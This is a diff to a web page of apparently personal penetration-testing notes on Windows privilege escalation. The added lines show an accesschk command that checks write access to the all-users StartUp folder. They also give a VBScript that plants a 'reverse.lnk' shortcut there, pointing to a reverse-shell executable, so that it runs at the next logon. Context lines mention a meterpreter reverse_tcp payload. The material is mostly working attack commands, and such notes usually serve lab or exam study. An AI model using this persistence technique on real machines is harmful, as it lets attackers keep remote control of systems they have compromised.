@@ -673,6 +673,10 @@ payload windows/meterpreter/reverse_tcp
 #send to http server
 Computer -&gt; C:ProgramData
 Microsoft\Windows\Start Menu\Startup
-#log out and start up as another user
-</code></pre><p id="01a08bcd-580f-4fb1-a08d-03d692823d03" class="">
-</p></div></article></body></html>
+#log out and start up as another user</code></pre><p id="01a08bcd-580f-4fb1-a08d-03d692823d03" class="">
+</p><pre id="7d1b9cf5-bad9-434c-a9eb-19678bfdb373" class="code"><code>.\accesschk.exe /accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</code></pre><p id="43d960fe-75f7-445f-a034-0825674beec6" class="">CreateShortcut.vbs</p><pre id="11424911-f972-4942-84e3-bf9410ff2a06" class="code"><code>Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)
+sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = &quot;C:\reverse.exe&quot;
+oLink.Save</code></pre><p id="c596c297-5770-46cf-b30f-59cd3a802064" class="">To run:</p><pre id="56c85d1c-1c85-4b74-a40a-c1f13c6b6c04" class="code"><code>cscript CreateShortcut.vbs
+</code></pre></div></article></body></html>
